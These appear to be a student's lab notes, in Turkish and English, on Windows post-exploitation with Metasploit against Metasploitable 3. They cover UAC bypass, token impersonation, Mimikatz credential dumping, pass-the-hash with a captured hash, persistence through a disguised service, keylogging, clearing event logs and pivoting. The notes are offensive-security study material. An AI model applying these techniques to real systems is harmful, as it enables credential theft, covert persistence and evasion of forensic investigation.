
+ We can utilize these post exploitation modules to enumerate information about the Windows system we currently have access to:

+ Enumerate user privileges
+ Enumerate logged on <span style="background:#d4b106">users</span>
+ <span style="background:#d4b106">VM check</span>
+ Enumerate <span style="background:#d4b106">installed programs</span>
+ Enumerate <span style="background:#d4b106">AVs</span>
+ Enumerate computers <span style="background:#d4b106">connected to domain</span>
+ Enumerate installed <span style="background:#d4b106">patches</span>
+ Enumerate <span style="background:#d4b106">shares</span>


---

### Bu module için metasploitable 3 win8 kullandık.
## Erişim sağlanmış hal için msfvenom ile meterpreter payload oluşturduk. python server ile karşıya attık. Multihandler çalıştırdık. ve hedefteki payloadı çalıştırdık.


---

![[Pasted image 20240308170905.png]]
## hedef sistemin alt yapısı x64 bizim meterpreter shell'imiz x86

### screenshot
### keyscan_start
### getsystem


![[Pasted image 20240308172106.png]]


---
## showmount
![[Pasted image 20240308172205.png]]
![[Pasted image 20240308172225.png]]
### Buradaki Type önemli çünkü buarada removable yazarsa bu USB bellek gibi birşey olabilir. 
## fixed normal hardisk için kullanılıyor.


---
## migrate
### ps komutuyla process'lerin listesini çıkardık şimdi x64 olmak için bir tane process'e migrate edeceğiz. 

![[Pasted image 20240308172615.png]]

---

#### Şimdi meterpreter'da yaptığımız herşeyin migrate komutunun bile CTRL + Z ile geri çıkıp normal msfconsole ile yaptığımız search ile bulunan modulleri var.

---

## get priv örneğin 2 sonuca da bakalım.

![[Pasted image 20240308173549.png]]



![[Pasted image 20240308173714.png]]

![[Pasted image 20240308173735.png]]

### 2 sinde de aynı sonuç çıkıyor ortaya.


---

## enum_logged_on
![[Pasted image 20240308174250.png]]
![[Pasted image 20240308174545.png]]
### daha önce logge on olmuş bütğn kullanıcaları bize çıkarır.

## Bu enum bir pentester için çok önemlidir. Farklı farklı kullanıclara erişme veya lateral movement yapmak için kullanılabilir.

---

## VM Check -->> Hedef bir VM mi yoksa normal local bir computer mi anlamamız çok önemli.

msf6> search vm check
![[Pasted image 20240308175034.png]]
![[Pasted image 20240308175050.png]]
### Eğer karşılaştığımız hedef bir VM ise bu bilgi de çok önemli . Çünkü VM breakout modulleri var ve bunları ADVANCED technique olarak kullanabiliriz.


---

## enum_applications
### Yüklenen programlar ve VERSION'ları yazar önemli bunlarda bir exploit olabilir ve bunu kullanarak priv escalate yapabiliriz.
![[Pasted image 20240308175558.png]]

![[Pasted image 20240308175654.png]]

---
## LOOT
![[Pasted image 20240308175924.png]]


---

## AntiVirus
### Şimdi hedef sisteme erişimimiz var ve enum devam ediyor. Burada hangi dosyalar AV tarafından taranıyor hangileri taranmıyor enum yapmamız çok önemli.

## meterpreter shell'den CTRL + Z ile geri çıktık.

### msf6> search type:post platform: windows av

![[Pasted image 20240308180440.png]]
## 75 çok fazla bunu sadeleştirmemiz lazım.

## msf6> search enum_av type:post 
![[Pasted image 20240308180536.png]]

![[Pasted image 20240308180745.png]]
![[Pasted image 20240308180838.png]]
![[Pasted image 20240308180942.png]]

---
## enum_computers
### Eğer bu bilgisayar bir domain'in birgisayarıysa bu şekilde ismini verir. Değilse bağımsız bir bilgisayarsa vermeyecektir.
![[Pasted image 20240308181517.png]]


---
## Installed Patches

![[Pasted image 20240308181726.png]]


![[Pasted image 20240308184011.png]]

## systeminfo
![[Pasted image 20240308184629.png]]

### normal windows shell'e geçtikten sonra 
## C:\Windows\System32>systeminfo

### bu bize yuklenen patches'ları de verecektir buna göre attack vektörü belirlenebilir.

---

## enum_shares

![[Pasted image 20240308184945.png]]

---

## RDP Enabled Check

![[Pasted image 20240308185200.png]]

![[Pasted image 20240308185247.png]]




---
## Windows Privilege Escalation: Bypassing UAC

+ User Account Control (UAC) is a Windows security feature introduced in Windows Vista that is used to <span style="background:#d4b106">prevent unauthorized changes from being made to the operating system.</span>

+ UAC is used to ensure that changes to the operating system require approval from the administrator.
### We can utilize the “Windows Escalate UAC Protection Bypass (<span style="background:#d4b106">In Memory Injection</span>)” module to bypass UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off.


## Kullanıcı Hesap Denetimi (UAC) Nedir?

UAC, **Kullanıcı Hesap Denetimi**'nin kısaltmasıdır ve Windows Vista'dan beri kullanılan bir güvenlik özelliğidir. UAC'nin temel amacı, bilgisayarınızda **izinsiz değişiklik yapılmasını önlemektir**. Bunu, yönetici ayrıcalığı gerektiren işlemleri yapmadan önce sizden onay alarak gerçekleştirir.


### Şu an ki sistemler dahil var ve kullanılıyor.
 ![[Pasted image 20240309215126.png]]
##### Örneğin CMD'yi admin yetkisiyle açmayı soruyor.
### Eğer sen normal standart kullanıcıysa buna evet yanıtını verince senden parola soracak.


## Bunu nasıl bypass edeceğiz ?

### Bununla alakalı msfconsole modulu var ve biz ilk erişimden sonra bunu uyguladığımızda bize 2. bir meterpreter shell verecek.
#### 2. açılacak olan meterpreter shell'de biz yine standart user olacağız ancak admin yetkisindeki işleri yapmaya yetkimiz olacak bu modul sayesinde.  UAC kapatılmış olacak


---
## Exploit
### x64 altyapısıyla erişim sağlamış olman lazım.

![[Pasted image 20240309221149.png]]
#### Bizim baştan meterpreter shellimiz x86 ydi fakat bir migrate işlemiyle hemen x64 yaptık ve UAC bypass exploit için hazırız.

## getsystem
### Bizim meterpreter shell aldıktan sonra yetki yukseltme için yapacağımız işlemlerden ilki hedef windows ise getsystem command çalıştırmaktır.
![[Pasted image 20240309220835.png]]
## Görüldüğü gibi bu komut işe yaramıyor demekki bizim adimin yetkilerinde birşeyler yapabilmemiz için UAC bypass kullanmamız lazım.

### getprivs

![[Pasted image 20240309221302.png]]
### Bizim şimdi bu durumda system de hanig kullanıcılar var ve bunların yetkileri neler bunu anlamamız lazım.
![[Pasted image 20240309221422.png]]
##### getuid komutunda bu user admin user olarak gözüküyor ama NT/AUTH olamadık. Bu kullanıcının dahil olduğu grubu anlamamız lazım.

### shell
##### normal shell'e geçtik
### net users
![[Pasted image 20240309221652.png]]
##### Bizim hedef sistemdeki kullanıcılar  bunlar. Asıl hedefimiz Administrator olmak.
![[Pasted image 20240309221839.png]]
### Bu da öğretmenin lab'ındaki durum toplam 3 tane users var.



## net localgroup administrators

![[Pasted image 20240309222103.png]]
![[Pasted image 20240309222139.png]]

### Vagrant kullanıcısı normal admin groupda oldugu için onur123 diye bir kullanıcı oluşturup onun üzeirden shell aldım öyle devam ediyoruz. 


##### Bir sürü teknik var neden bundan başladık biz exploit etmeye çünkü Wİndows Vistadan buyana bütün Windows'larde UAC user access control programı var ve bu çok stabil bir privescalete tekniği. Ayrıca da çok etkili bir teknik ilave bir tinkering ve tweaking durumu olamadığı için bu tekniği uyguluyoruz.

### Biz özellikle UAC bypass tekniklerden In Memory Injection Module 'e bakacağız.

## search bypassuac
![[Pasted image 20240309224352.png]]
>[!warning] ÇOK ÖNEMLİ UYARI....... 
>Öyle basit bir kullanıcı da bu exploit yapılamıyor. Kullanıcı admin group içinde olduğu zaman bu exploit gerçekleştirilebiliyor.

### set payload windows/x64/meterpreter/reverse_tcp
### LPORT aynı kalmasın 4444-->>4445 değiştir
### set session 13
### run 

![[Pasted image 20240309230726.png]]
#### Bu hatayı verdi çünkü target architecture değiştirilmediği için bunu
### <span style="background:#d4b106">set TARGET Windows\ x64</span>

### Bu şekilde değiştirdik ve....


![[Pasted image 20240309231104.png]]
![[Pasted image 20240309231147.png]]
## Bizde 2 tane session var şuan biri bizim aldığımız diğeri de bypass modulunun 4445 portundan yarattığı.

### Biz şimdi getsystem komutunu çalıştırırsak getprivs'e yeni yetki eklenmiş olup sistemi NT/AUTH olarak ele geçirmiş oluyoruz.
![[Pasted image 20240309231338.png]]
### ps filtering
### ps -S lsass.exe
## migrate 688
## hashdump 
#hashdump 
![[Pasted image 20240309232131.png]]

---

## Access Token Impersonation
#token 
#token-windows-priv-escalate 
#Access-Token-Impersonation 

### Windows Access Tokens
+ Windows access tokens are a <span style="background:#d4b106">core element of the authentication process</span> on Windows and are created and managed by the 
+ ### Local Security Authority Subsystem Service (LSASS). #LSASS #lsass 
### A Windows access token is responsible for --->><span style="background:#d4b106">identifying</span> and <span style="background:#d4b106">describing </span>the security context of a process or thread running on a system. 
+ <span style="background:#d4b106">Simply put, an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed</span>.
+ <span style="background:#40a9ff">Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process.</span> #winlogon 
 
+<span style="background:#ff4d4f"> This token is then attached to the #userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.</span>

---

### Windows access tokens are categorized based on the varying security levels assigned to them.
+ These security levels are <span style="background:#d4b106">used to determine the privileges</span> that are assigned to a specific token.
+ An access token will typically be assigned one of the following security levels:
+ <span style="background:#d4b106">Impersonate-level tokens </span>are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons.
+ <span style="background:#d4b106">Delegate-level tokens</span> are typically created through an <font color="#ff0000">interactive login on Windows,</font> primarily through a traditional login or through remote access protocols such as RDP.
### Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.
![[Pasted image 20240311103131.png]]
#### Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system.

---
## Windows Privileges
+ The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to  gain initial access as well as the impersonation or delegation tokens available.
## The following are the privileges that are required for a successful impersonation attack:

## Yaptığımız Attack Başarılı olması için getpriv yazdıktan sonra bu token'lar gerekiyor.
### #SeAssignPrimaryToken: This allows a user to impersonate tokens.
### #SeCreateToken: This allows a user to create an arbitrary token with administrative privileges. 
### #SeImpersonatePrivilege: This allows a user to create a process under the security context of another user typically with administrative privileges.
#### Özellikle de #SeImpersonatePrivilege Token olsa iyi olur.

---
## The Incognito Module
+ Incognito is a built-in meterpreter module that was originally a standalone application that a<span style="background:#d4b106">llows you to impersonate user tokens after successful exploitation.</span>
+ We can use the incognito module to display a list of available tokens that we can impersonate.

#incognito-win-priv-esca

---
## exploit
![[Pasted image 20240311114358.png]]
## getprivs
![[Pasted image 20240311114443.png]]

### load incognito
### help
![[Pasted image 20240311114524.png]]
### list tokens
![[Pasted image 20240311114613.png]]
### list_tokens -u
### list_tokens -g
![[Pasted image 20240311114725.png]]
![[Pasted image 20240311114743.png]]

### meterpretershell aldıktan sonra x86 da aldığımızı fark edip kendimizi migrate ettik bir tane x64 e . sonra load incognito yaptık.

## buradan sonra hangi yetkiler var getprivs ile baktık.
### sonrasında list_tokens komutuyla elimizde hanig token'ları kullanabilme durumu var buna bakıyoruz.

![[Pasted image 20240311115038.png]]
## delegation token interactive login ile kullanılna tokendı ve en yaygın tehdidi oluşturuyor.

### <span style="background:#d4b106">impersonate_token "NT AUTHORITY\SYSTEMY\SYSTEM"</span>

![[Pasted image 20240311115334.png]]
![[Pasted image 20240311115347.png]]


### Şimdi burada çok önemli birşey oldu vagrant olarak bizim delegation token kullanılmadı yukarıda hatası var ben de çnce bir alttaki token'ın yetkisine geçtim sonra da NT AUTH / SYSTEM olana geçtim. EKran görüntülerini iyi incele


![[Pasted image 20240311115840.png]]
![[Pasted image 20240311115821.png]]
![[Pasted image 20240311115750.png]]

---

## pgrep explorer
### meterpreter'da process aratma
#process-arama-meterpreter

### pgrep lsass
### migrate -N lsass.exe
## hashdump çalışması için lsass.exe'ye migrate etsen iyi olur.
![[Pasted image 20240311120200.png]]

## EĞER TOKEN'LARI LİSTELEDİN VE HERHANGİ BİR DELEGATION VEYA IMPERSOMATION TOKEN YOKSA ELIMIZ DE O ZAMAN POTATO ATTACK YAPMAN GEREKECEK.
#potato-attack 

---

## Dumping Hashes With Mimikatz
#mimikatz #kiwi 
Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of <span style="background:#d4b106">plaintext credentials from memory</span>,  password hashes from local #SAM databases, and more.
##### The SAM #Security-Account-Manager  database, is a database file on Windows systems that stores users passwords and can be used to authenticate users both locally and remotely.
+ We can utilize the pre-built mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.
## Kiwi allows us to dynamically execute Mimikatz on the target system <span style="background:#d4b106">without touching the disk.</span>

---
#### ÖNEMLİ
### mimikatz'i biz karşı tarafa gönderip manuel olarak execute edebiliriz veya meterpreter'den kiwi modulu ile aynı şeyi yapabiliriz.
#### HEDEFE MIMIKATZ GONDERMENIN RISK'LERI HESAP EDILMESI GEREKIR. AV 'E YAKALANMA RISKI VAR VEYA KARSI TARAFIN SISTEMINDE KALACAGI ICIN ORADA IZ KALINTI BIRAKMA IHTIMALI VAR.
## dinamik olarak memory üzerinden işlemleri yapmak iyi olabilir.
---
## exploit
## badblue
![[Pasted image 20240311121827.png]]
#badblue 
### bufferoverflow'a zaafiyeti var bu server'ın
![[Pasted image 20240311121930.png]]

## pgrep lsass
### migrate -N lsass.exe
![[Pasted image 20240311122134.png]]

## load kiwi
![[Pasted image 20240311122236.png]]

## help
![[Pasted image 20240311122350.png]]

## creds_all
![[Pasted image 20240311122511.png]]

### lsa_dump_sam
![[Pasted image 20240311122624.png]]

## lsa_dump_secrets
![[Pasted image 20240311122732.png]]

## BURADA BULDUĞUMUZ HASH'LERIN HEPSINI "PASS THE HASH ATTACK" SALDIRISINDA KULLANACAGIZ

---
## HEDEFE MİMİKAZT GONDERME
![[Pasted image 20240311123056.png]]
### Bizim kali içinde usr/share klasöründe windows-resources klasörü içinde mimikatz var  .

## Bunu meterpreter upload ile de gönderebiliriz. python http server ile de gonderebiliriz. veya CERUTIL

## certutil
### #cerutil-windows-transfer 

![[Pasted image 20240311124837.png]]

## mimikatz #mimikatz 
https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz

### privilege::debug

![[Pasted image 20240311125509.png]]


### sekurlsa::logonpasswords

![[Pasted image 20240311125527.png]]
![[Pasted image 20240311125550.png]]
![[Pasted image 20240311125603.png]]
![[Pasted image 20240311125619.png]]
![[Pasted image 20240311125631.png]]


### sekurlsa::minidump lsass.dmp

---

## Pass-The-Hash With PsExec
## #psexec 
#smb-psexec 
#smb-login-psexec 

+ Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.
##  We can use the PsExec module to legitimately authenticate with the target system via #SMB.
+ This technique will allow us to obtain access to the target system via <span style="background:#d4b106">legitimate credentials</span> as opposed to obtaining access via service exploitation.
---

## Exploit
![[Pasted image 20240311134506.png]]
### hashdump komutunu çalıştırmak için lsass.exe'ye migrate etmek gerekir.

![[Pasted image 20240311134812.png]]
### Bunları katdettik.

### exploit(multi/handler) > search psexec

![[Pasted image 20240311135011.png]]
## use 5

### set RHOST 10.0.2.5

### set payload windows/x64/meterpreter/reverse_tcp

![[Pasted image 20240311135322.png]]

### Bir önceki meterpreter session'u kill kapattık.


---
### hash'i kopyaladık
aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
### set SMBUSR Administrator
### SmbPass aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
![[Pasted image 20240311135722.png]]
![[Pasted image 20240311135743.png]]
### meterpreter shell'i tertemiz anamızın aksütü gibi helal credential's ile aldık.

## aynısını onur123 kullanıcısı ile de denedik başarılı oldu.

---

## Establishing Persistence On Windows
#persistence
### Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.
## Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.


---

### Biraz önce credential's alma ve bunu psexec ile kullanmayı çalışmıştık. Burada şöyle bir durum var erişim sapladık ve sonra yetkiyi yükselttik. Sistem yeniden başlarsa kapanırsa herşey gidecek. Elimizde credentials var diye düşünüyoruz ya değiştirirlerse credentials'ı o zaman herşey son bulur ve hedefe bağlanmak için herşeye baştan başlayıp yeni bir attack yapmak gerekir.

## Just in case>>> Creds değiştirilebilir diye Establishing Persistence yapacağız. Her windows yeniden başladığında bizim payloadımız ile bize geri istek yapacak 5 sn de bir

---

### Bu durum ne bizim vulnerable service exploit'lere dayanacak ne de bizim elde ettiğimiz hash'lere password'lere dayanacak. Çünkü hepsi hedefin kontrolünde



---

## Bu durumu elde etmek için msfconsole post-exploitation persistence module 'u kullanacağız.
#post-exploitation-persistence

### search platform:windows persistence
![[Pasted image 20240311152456.png]]

## exploit/windows/local/persistence    
### Windows Persistent Registry Startup Payload Installer

##### 8 numaralı persistence var. Bıunda sistem yeni başladığında programı çalıştıracak payload'ı çalıştıracak şekilde ayarlı fakat buna tam olarak RELY ON yapamayız buna dayanmamalı bizim attack vektörümüz.

## Bizim hedefimiz söyle olmalı windows'ta sürekli çalışan ve biz access'i ne zaman kaybedersek hemen bize geri meterpreter shell verecek şekilde olmalı.

### Bunun sebebi belki meterpreter shell yaklaşık 15-20 dakikalık bir hazırlık sonucunda geldi. Bu işlemleri tekrar tekrar baştan yapmamak için de lazım aynı zamanda yeniden başlatma credentials değişimi veya exploitable service'ye yama patch ekleme durumlarına karşı da lazım.


---
### exploit/windows/local/persistence_service 
## Windows Persistent Service Installer

## use 9


## Description:
### This Module will generate and upload an executable to a remote host, next will make it a persistent service.
###  It will create a new service which will start the payload whenever the service is running. <span style="background:#d4b106">Admin or system privilege is required.</span>


![[Pasted image 20240311153323.png]]

### Bu module hedefte bir payload oluşturacak. Biz ne zaman bir multi/handler ayaklandırsak dinlemeye başladığımızda biza shell verecek.
## Admin veya system yetkisi gerekiyor.

## SERVICE NAME
![[Pasted image 20240311153735.png]]
### Biz burada oluşturduğumuz service yasal legitimate gözükmesi için bir isim belirleyebiliriz.
![[Pasted image 20240311153842.png]]
### Örnek bizim kendi görev yöneticimizden service listemiz bunlara benzer veya aynı isimlerden yazabiliriz.

>[!info] set sessions 6
set LPORT 4445 ---->> değitirmene gerek yok zaten eski session ölmüş olduğu için port serbest
set Payload windows/x64/meterpreter/reverse_tcp
set SERVICE_NAME KARAN.exe

## run
![[Pasted image 20240311154458.png]]
#### Hata aldık çünkü sadece 32 bitlik altyapıda oluşturulan payloadda çalışıyormuş.

### set Payload windows/meterpreter/reverse_tcp

![[Pasted image 20240311154710.png]]
## Bize yeni shell'i verdi
### Target sistemde karan.exe'yi oluşturmuş service'lerde çalışıyor. Şimdi bütün sessions'ları iptal edip multihandler açacağım bakalım dinlerken bize shell gelecek mi?

![[Pasted image 20240311154849.png]]

---
![[Pasted image 20240311155009.png]]
![[Pasted image 20240311155024.png]]
### payload x86 olduğu için bize o alt yapı ile shell verdi. Biz bunu x64 zaten yaparız sorun yok.



-----
## HEDEF SİSTEM YENİDEN BAŞLATILDI
![[Pasted image 20240311155514.png]]
### TASK MANAGER'DA KARAN.EXE DURUYOR.

## KALI LINUX'U kapattık açtık. msfconsole'u kapattık geri açtık. Direk multihandler ayarlarını payload'ı ayarlayıp run dedik ve meterpreter shell elimizde.

### Artık buraya tamamen yerleştik.
![[Pasted image 20240311155811.png]]



---
## Enabling RDP
#RDP 

The Remote Desktop Protocol (RDP) is a proprietary GUI remote access protocol developed by Microsoft and is used to remotely connect and interact with a Windows system.
### RDP uses TCP #port3389 by default.
<span style="background:#ff4d4f">+ RDP is disabled by default,</span> however, we can utilize an MSF exploit module to enable RDP on the Windows target and consequently utilize RDP to remotely access to the target system.
## RDP authentication requires a legitimate user account on the target system as well as the user’s password in clear-text.

---
### Bir önceki module de persistence yaptıgımız için ben 10.0.2.4 IP 'ine Port 4444 de ne zaman multi handler açsam direk x86 meterpretershell alıyorum

## Burada lsass.exe 'ye migrate edip NT/AUTH system yetkisne geçiyorum. Buradan Kiwi ile creds_all yapıp bizim sistem de ne kadar plain text pass varsa alıyorum ki bunu RDP De kullanacağım.
![[Pasted image 20240312110406.png]]

---
#badblue 
![[Pasted image 20240312110545.png]]

### Öğretmen derste badblue ile girdi.

---
## search enable_rdp
![[Pasted image 20240312111557.png]]







---
## Administrator Şifresini Değiştirme

### Öneclikle bu kesinlikle tavsiye edilmez çünkü artık sisteme girildiğini net bir şekilde belli etmiş oluyorsun

#### meterpreter> shell

#### C:\Windows\system32>

#### net user Administrator cybernotus123

![[Pasted image 20240312112533.png]]

----

## search enable_rdp
### session'u verip direk de enable yapabiliriz veya biz zaten session'ımızda ADmin yetkisinde olduğumuz için yeni bir kullanıcı ve pass de oluşturabiliriz.

![[Pasted image 20240312120924.png]]
---

### RDP CONNECTION
#xfreerdp #rdp-connect #xfreerdp-rdp-connect
#remmina #remmina-rdp-connection
![[Pasted image 20240312112811.png]]



![[Pasted image 20240312120857.png]]
### Bizim lab hata verdi TLS hatası o yüzden öğretmeninkinden devam #remmina veya #xfreerdp  ile bağlantı sağladık

#xfreerdp 
## xfreerdp /u:kali /p:kali /v:10.0.2.15 
### Bu komutla RDP bağlantısı alındı.

---

## Windows Keylogging
#key-logging-windows
#keylogging 
#klavye-tuşları-kaydı


+ Keylogging is the process of recording or capturing the keystrokes entered on a target system.
### This technique is not limited to post exploitation, there are <span style="background:#d4b106">plenty of programs and USB devices</span> that can be used to capture and transmit the keystrokes entered on a system.

---

>[!warning] ÖNEMLİ UYARI meterpreter da keylogging çalıştırmak için EXPLORER.exe'ye migrate edersek daha verimli çalışıyor. Öğretmenin tecrübeye dayalı önerisi.
>![[Pasted image 20240312123613.png]]
>

#### pgrep explorer
### migrate 

---

## key commands
![[Pasted image 20240312125358.png]]

### keyscan_start
## keyscan_dump
![[Pasted image 20240312125700.png]]
### Shift tuşuna basışlarımı dahil kaydeder

```
### <CR> enter demek
### <^H> backspace
```

---
## Windows Event Logs
#logs #windows-log 

+ The Windows OS stores and catalogs all actions/events performed on the system and stores them in the #Windows-Event-log.
+ Event logs are categorized based on the type of events they store:
### <span style="background:#d4b106">Application logs:</span> Stores application/program events like startups, crashes etc.
### <span style="background:#d4b106">System logs:</span> Stores system events like startups, reboots etc.
### <span style="background:#d4b106">Security logs: </span>Stores security events like password changes, authentication failures etc.
+ Event logs can be accessed via the 
##### Event Viewer on Windows.

#### The event logs are <span style="background:#d4b106">the first stop for any forensic investigator</span> after a compromise has been detected. It is therefore very important to clear your tracks after you are done with your assessment.

## BİR PENTESTER OLARAK NE ZAMAN İŞİN HEDEF SİSTEMLE BİTTİĞİNDE BU EVENT LOG'LARI SİLMEN ÇOK ÖNEMLİDİR.



### CLEAN UP PROCESS
### 1. Event logları Temizleme
### 2. Hedef gönderdiğin dosyaları ortadan kaldırma
### 3. Yazdığın exploit kodları ve payload'ları yok etmelisin

## Bu yüzden yaptığın faaliyetlerin memory üzerinde geçici olması önemli hale geliyor. msfconsole meterpreter bunu sağlıyor.

---

## Hedefte event viewer'a bakalım
![[Pasted image 20240312131742.png]]![[Pasted image 20240312131843.png]]
### Windows Logs altında application'u inceliyoruz.

![[Pasted image 20240312131953.png]]
1177 Tane Log kaydedilmiş daha önce

---

## Security Logs 
![[Pasted image 20240312132057.png]]
### Üzerine çift tıkladığında
![[Pasted image 20240312132225.png]]

---
### Örneğin Administrator kullanıcısını şifresini değiştirelim bakalım log'lara bu nasıl düşecek.

## net user Administrator vagrant

![[Pasted image 20240312132654.png]]
 ![[Pasted image 20240312132750.png]]
### Bunu Forensic Investigator tespit ettiği anda hemen bütün sistemin internetini keser ve LOG'ların hepsini araştırmaya başlar.


## clearev  command
#logları-silmek

![[Pasted image 20240312133043.png]]

# müftüüü

![[Pasted image 20240312133229.png]]

### Bütün log'lar tertemiz sadece log'lar temizlendi log'u var
![[Pasted image 20240312133158.png]]

#### hedef sisteme mimikatz yüklemiştik. Bunları nereye yuüklediğimizi nıt alıp geri sistemden çıkarken hepsini tek tek silmemiz gerekiyor. 


----

## Pivoting
#pivoting #pivoting-msf
Pivoting is a post exploitation technique that involves utilizing a compromised host to attack other systems on the compromised host’s private internal network.
+ After gaining access to one host, we can use the compromised host to exploit other hosts on the same internal network to which we could not access previously. 
+ Meterpreter provides us with the ability to add a network route to the internal network’s subnet and consequently scan and exploit other systems on the network.

![[Pasted image 20240312133350.png]]

---

### `msfconsole` da `run autoroute -s 10.0.23.0/20` komutu, **belirtilen ağ aralığındaki tüm ana bilgisayarlara otomatik yollar oluşturur**.

**Komutun parçaları:**

- `msfconsole`: Metasploit konsolunu başlatmak için kullanılan komut.
- `run autoroute`: Otomatik rota oluşturma işlevini çalıştırmak için kullanılan komut.
- `-s`: Rota oluşturulacak ağ aralığını belirlemek için kullanılan seçenek.
- `10.0.23.0/20`: Rota oluşturulacak ağ aralığı. Bu durumda, 10.0.23.0 ağındaki tüm ana bilgisayarlara (10.0.23.1 - 10.0.23.254) otomatik yollar oluşturulur.

**Komutun işlevi:**

Bu komut, Metasploit'in otomatik rota oluşturma işlevini kullanarak belirtilen ağ aralığındaki tüm ana bilgisayarlara otomatik yollar oluşturur. Otomatik yollar, bir hedefe ulaşmak için en iyi yolu belirlemek için yönlendirme protokolünü kullanır. Bu, ağınızdaki trafiği optimize etmeye ve performansı iyileştirmeye yardımcı olabilir.

**Komutun kullanımı:**

Bu komutu kullanmak için, önce Metasploit konsolunu başlatmanız gerekir. Bunu `msfconsole` komutunu çalıştırarak yapabilirsiniz. Konsol açıldıktan sonra, `run autoroute -s 10.0.23.0/20` komutunu çalıştırarak otomatik rota oluşturma işlevini çalıştırabilirsiniz.

**Komutun çıktısı:**

Komut başarıyla çalıştırılırsa, Metasploit konsolu otomatik olarak oluşturulan rotaların bir listesini gösterecektir.

**Örnek:**

```
msfconsole

run autoroute -s 10.0.23.0/20

[*] Autorouting to 10.0.23.0/20...
[*] Adding route 10.0.23.0/24 via 10.0.23.1
[*] Adding route 10.0.23.1/32 via 10.0.23.1

[*] Autorouting complete.
```

**Notlar:**

- Bu komutu çalıştırmadan önce, Metasploit'in ağınızdaki yönlendirme protokolüne erişebildiğinden emin olun.
- Bu komut, yalnızca Metasploit'in ağınızdaki tüm cihazları kontrol edebildiği durumlarda güvenlidir.

---
#networking
![[Pasted image 20240312154615.png]]
![[Pasted image 20240312154711.png]]
![[Pasted image 20240312154725.png]]

### Bu Pivoting Durumunu Çalışmak İçin Network'ü şu Şekilde ayarladım

### 1. Kali --> Bridge Adapter 192.168.1.3
### 2. Win Metasploitable3 --> Bridge + Nat Network 192.168.1.5 + 10.0.2.9
### 3. Ubuntu Metasploitable 3 --> Nat Network 10.0.2.8

## Bütün hepsinden birbirine ping attım bridge'ler kendi arasında görüyorlar. Nat Network'ler de birbilerini görüyorlar
---

## Senaryo ben şimdi                 
### Win-Metasploitable3   e saldıracağım. sonra hangi ağda olduğuna bakıp 1 ağ'la daha iletişim kurduğuna bakacağım ona da ilk erişim sağladığım üzerinden saldıracağım.

---
### İlk hedefe erişim sağladık ve meterpreter shell var
## Burada ipconfig çalıştırdık bu makineye natnetwork'den 2 makine bağlı. ubuntu ve win7 toplam 4 sanal makine açık.

### kali+windos MTS--->>ubuntu+win7

---
## run autoroute -s 10.0.2.0/24

### Bunu çalıştırmakla ilk erişim noktasından ona kimler bağlıysa erişebileceğiz.

![[Pasted image 20240312160124.png]]


#### Ve ARTIK KARIŞTIRMAMAK İÇİN SHELL'E İSİM VERİYORUZ.
### sessions -n victim-1 -i 1
![[Pasted image 20240312160212.png]]

### Bu run autoroute command sadece meterpreter içinde session elde ettikten sonra yapılıyor ve msfconsole modullerinde geçerlidir. Gidip nmap scan yapamazsın. 
## Port taraması yapacaksan eğer msfconsole da portscan modulunu kullanmalıyız.


---
### Pivoting MSF
## 1. meterpreter shell aldıktan sonra başka ağlara bağlanabiliyormu bak
### 2. Bunu bulduk ifconfig ile başka subnetteki bir ağa bağlı buraya autoroute yap.
## 3. autoroute yaptıktan sonra butaya msfconsole içinden portscan yap ve hangi portların açık olduğunu öğren.
### 4. Şimdi artık msfconsole dışından enum'a devam edeceksin portforwarding yapmanlazım. Taramak isteğin porta özel port farwarding yap
![[Pasted image 20240319121809.png]]
## 5. sonra buradaki service'lere tarama yap
 ![[Pasted image 20240319121530.png]]
##  #msf-port-forwarding
### meterpreter> portfwd add -l 5454 -p 445 -r 10.0.2.5
![[Pasted image 20240319122902.png]]
